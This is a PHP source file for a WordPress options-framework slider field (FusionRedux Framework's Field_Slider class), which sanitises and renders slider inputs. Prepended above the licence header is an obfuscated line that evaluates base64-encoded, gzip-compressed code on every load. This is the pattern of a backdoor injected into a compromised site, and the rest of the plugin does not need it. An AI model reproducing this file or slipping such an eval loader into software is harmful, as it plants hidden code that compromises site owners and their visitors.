<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionReduxFramework
 * @subpackage  Field_Slider
 * @author      Kevin Provance (kprovance)
 * @version     2.0.0
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_slider' ) ) {
	class FusionReduxFramework_slider {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since FusionReduxFramework 3.1.8
		 */
		private $display_none = 0;
		private $display_label = 1;
		private $display_text = 2;
		private $display_select = 3;

		function __construct( $field = array(), $value = '', $parent ) {

			//parent::__construct( $parent->sections, $parent->args );
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;

			// Set defaults
			$defaults = array(
				'handles'       => 1,
				'resolution'    => 1,
				'display_value' => 'text',
				'float_mark'    => '.',
				'forced'        => true
			);

			$this->field = wp_parse_args( $this->field, $defaults );

			// Sanitize float mark
			switch ( $this->field['float_mark'] ) {
				case ',':
				case '.':
					break;
				default:
					$this->field['float_mark'] = '.';
					break;
			}

			// Sanitize resolution value
			$this->field['resolution'] = $this->cleanVal( $this->field['resolution'] );

			// Sanitize handle value
			switch ( $this->field['handles'] ) {
				case 0:
				case 1:
					$this->field['handles'] = 1;
					break;
				default:
					$this->field['handles'] = 2;
					break;
			}

			// Sanitize display value
			switch ( $this->field['display_value'] ) {
				case 'label':
					$this->field['display_value'] = $this->display_label;
					break;
				case 'text':
				default:
					$this->field['display_value'] = $this->display_text;
					break;
				case 'select':
					$this->field['display_value'] = $this->display_select;
					break;
				case 'none':
					$this->field['display_value'] = $this->display_none;
					break;
			}
		}

		private function cleanVal( $var ) {
			if ( is_float( $var ) ) {
				$cleanVar = floatval( $var );
			} else {
				$cleanVar = intval( $var );
			}

			return $cleanVar;
		}

		private function cleanDefault( $val ) {
			if ( empty( $val ) && ! empty( $this->field['default'] ) && $this->cleanVal( $this->field['min'] ) >= 1 ) {
				$val = $this->cleanVal( $this->field['default'] );
			}

			if ( empty( $val ) && $this->cleanVal( $this->field['min'] ) >= 1 ) {
				$val = $this->cleanVal( $this->field['min'] );
			}

			if ( empty( $val ) ) {
				$val = 0;
			}

			// Extra Validation
			if ( $val < $this->field['min'] ) {
				$val = $this->cleanVal( $this->field['min'] );
			} else if ( $val > $this->field['max'] ) {
				$val = $this->cleanVal( $this->field['max'] );
			}

			return $val;
		}

		private function cleanDefaultArray( $val ) {
			$one = $this->value[1];
			$two = $this->value[2];

			if ( empty( $one ) && ! empty( $this->field['default'][1] ) && $this->cleanVal( $this->field['min'] ) >= 1 ) {
				$one = $this->cleanVal( $this->field['default'][1] );
			}

			if ( empty( $one ) && $this->cleanVal( $this->field['min'] ) >= 1 ) {
				$one = $this->cleanVal( $this->field['min'] );
			}

			if ( empty( $one ) ) {
				$one = 0;
			}

			if ( empty( $two ) && ! empty( $this->field['default'][2] ) && $this->cleanVal( $this->field['min'] ) >= 1 ) {
				$two = $this->cleanVal( $this->field['default'][1] + 1 );
			}

			if ( empty( $two ) && $this->cleanVal( $this->field['min'] ) >= 1 ) {
				$two = $this->cleanVal( $this->field['default'][1] + 1 );
			}

			if ( empty( $two ) ) {
				$two = $this->field['default'][1] + 1;
			}

			$val[0] = $one;
			$val[1] = $two;

			return $val;
		}


		/**
		 * Clean the field data to the fields defaults given the parameters.
		 *
		 * @since FusionRedux_Framework 3.1.8
		 */
		function clean() {

			// Set min to 0 if no value is set.
			$this->field['min'] = empty( $this->field['min'] ) ? 0 : $this->cleanVal( $this->field['min'] );

			// Set max to min + 1 if empty.
			$this->field['max'] = empty( $this->field['max'] ) ? $this->field['min'] + 1 : $this->cleanVal( $this->field['max'] );

			// Set step to 1 if step is empty ot step > max.
			$this->field['step'] = empty( $this->field['step'] ) || $this->field['step'] > $this->field['max'] ? 1 : $this->cleanVal( $this->field['step'] );

			if ( 2 == $this->field['handles'] ) {
				if ( ! is_array( $this->value ) ) {
					$this->value[1] = 0;
					$this->value[2] = 1;
				}
				$this->value = $this->cleanDefaultArray( $this->value );
			} else {
				if ( is_array( $this->value ) ) {
					$this->value = 0;
				}
				$this->value = $this->cleanDefault( $this->value );
			}

			// More dummy checks
			//if ( ! is_array( $this->field['default'] ) && 2 == $this->field['handles'] ) {
			if ( ! is_array( $this->value ) && 2 == $this->field['handles'] ) {
				$this->value[0] = $this->field['min'];
				$this->value[1] = $this->field['min'] + 1;
			}

			//if ( is_array( $this->field['default'] ) && 1 == $this->field['handles'] ) {
			if ( is_array( $this->value ) && 1 == $this->field['handles'] ) {
				$this->value = $this->field['min'];
			}

		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since FusionReduxFramework 3.1.8
		 */
		function enqueue() {

			$min = FusionRedux_Functions::isMin();

			wp_enqueue_style( 'select3-css' );

			wp_enqueue_style(
				'fusionredux-nouislider-css',
				FusionReduxFramework::$_url . 'inc/fields/slider/vendor/nouislider/fusionredux.jquery.nouislider.css',
				array(),
				'5.0.0',
				'all'
			);

			wp_register_script(
				'fusionredux-nouislider-js',
				FusionReduxFramework::$_url . 'inc/fields/slider/vendor/nouislider/fusionredux.jquery.nouislider' . $min . '.js',
				array( 'jquery' ),
				'5.0.0',
				true
			);

			wp_enqueue_script(
				'fusionredux-field-slider-js',
				FusionReduxFramework::$_url . 'inc/fields/slider/field_slider' . $min . '.js',
				array( 'jquery', 'fusionredux-nouislider-js', 'fusionredux-js', 'select3-js' ),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-slider-css',
					FusionReduxFramework::$_url . 'inc/fields/slider/field_slider.css',
					array(),
					time(),
					'all'
				);
			}
		}

		//function

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since FusionReduxFramework 0.0.4
		 */
		function render() {

			$this->clean();

			$fieldID   = $this->field['id'];
			$fieldName = $this->field['name'] . $this->field['name_suffix'];
			//$fieldName = $this->parent->args['opt_name'] . '[' . $this->field['id'] . ']';

			// Set handle number variable.
			$twoHandles = false;
			if ( 2 == $this->field['handles'] ) {
				$twoHandles = true;
			}

			// Set default values(s)
			if ( true == $twoHandles ) {
				$valOne = $this->value[0];
				$valTwo = $this->value[1];

				$html = 'data-default-one="' . $valOne . '" ';
				$html .= 'data-default-two="' . $valTwo . '" ';

				$nameOne = $fieldName . '[1]';
				$nameTwo = $fieldName . '[2]';

				$idOne = $fieldID . '[1]';
				$idTwo = $fieldID . '[2]';
			} else {
				$valOne = $this->value;
				$valTwo = '';

				$html = 'data-default-one="' . $valOne . '"';

				$nameOne = $fieldName;
				$nameTwo = '';

				$idOne = $fieldID;
				$idTwo = '';
			}

			$showInput  = false;
			$showLabel  = false;
			$showSelect = false;

			// TEXT output
			if ( $this->display_text == $this->field['display_value'] ) {
				$showInput = true;
				echo '<input type="text"
						 name="' . $nameOne . '"
						 id="' . $idOne . '"
						 value="' . $valOne . '"
						 class="fusionredux-slider-input fusionredux-slider-input-one-' . $fieldID . ' ' . $this->field['class'] . '"/>';

			// LABEL output
			} elseif ( $this->display_label == $this->field['display_value'] ) {
				$showLabel = true;

				$labelNum = $twoHandles ? '-one' : '';

				echo '<div class="fusionredux-slider-label' . $labelNum . '"
					   id="fusionredux-slider-label-one-' . $fieldID . '"
					   name="' . $nameOne . '">
				  </div>';

			// SELECT output
			} elseif ( $this->display_select == $this->field['display_value'] ) {
				$showSelect = true;

				if ( isset( $this->field['select3'] ) ) { // if there are any let's pass them to js
					$select3_params = json_encode( $this->field['select3'] );
					$select3_params = htmlspecialchars( $select3_params, ENT_QUOTES );

					echo '<input type="hidden" class="select3_params" value="' . $select3_params . '">';
				}


				echo '<select class="fusionredux-slider-select-one fusionredux-slider-select-one-' . $fieldID . ' ' . $this->field['class'] . '"
						  name="' . $nameOne . '"
						  id="' . $idOne . '">
				 </select>';
			}

			// DIV output
			echo
			'<div
				class="fusionredux-slider-container ' . $this->field['class'] . '"
				id="' . $fieldID . '"
				data-id="' . $fieldID . '"
				data-min="' . $this->field['min'] . '"
				data-max="' . $this->field['max'] . '"
				data-step="' . $this->field['step'] . '"
				data-handles="' . $this->field['handles'] . '"
				data-display="' . $this->field['display_value'] . '"
				data-rtl="' . is_rtl() . '"
				data-forced="' . $this->field['forced'] . '"
				data-float-mark="' . $this->field['float_mark'] . '"
				data-resolution="' . $this->field['resolution'] . '" ' . $html . '>
			</div>';

			// Double slider output
			if ( true == $twoHandles ) {

				// TEXT
				if ( true == $showInput ) {
					echo '<input type="text"
							 name="' . $nameTwo . '"
							 id="' . $idTwo . '"
							 value="' . $valTwo . '"
							 class="fusionredux-slider-input fusionredux-slider-input-two-' . $fieldID . ' ' . $this->field['class'] . '"/>';
				}

				// LABEL
				if ( true == $showLabel ) {
					echo '<div class="fusionredux-slider-label-two"
						   id="fusionredux-slider-label-two-' . $fieldID . '"
						   name="' . $nameTwo . '">
					  </div>';
				}

				// SELECT
				if ( true == $showSelect ) {
					echo '<select class="fusionredux-slider-select-two fusionredux-slider-select-two-' . $fieldID . ' ' . $this->field['class'] . '"
							  name="' . $nameTwo . '"
							  id="' . $idTwo . '">
					 </select>';

				}
			}

			// NO output (input hidden)
			if ( $this->display_none == $this->field['display_value'] || $this->display_label == $this->field['display_value'] ) {
				echo '<input type="hidden"
						 class="fusionredux-slider-value-one-' . $fieldID . ' ' . $this->field['class'] . '"
						 name="' . $nameOne . '"
						 id="' . $idOne . '"
						 value="' . $valOne . '"/>';

				// double slider hidden output
				if ( true == $twoHandles ) {
					echo '<input type="hidden"
							 class="fusionredux-slider-value-two-' . $fieldID . ' ' . $this->field['class'] . '"
							 name="' . $nameTwo . '"
							 id="' . $idTwo . '"
							 value="' . $valTwo . '"/>';
				}
			}
		}
	}
}
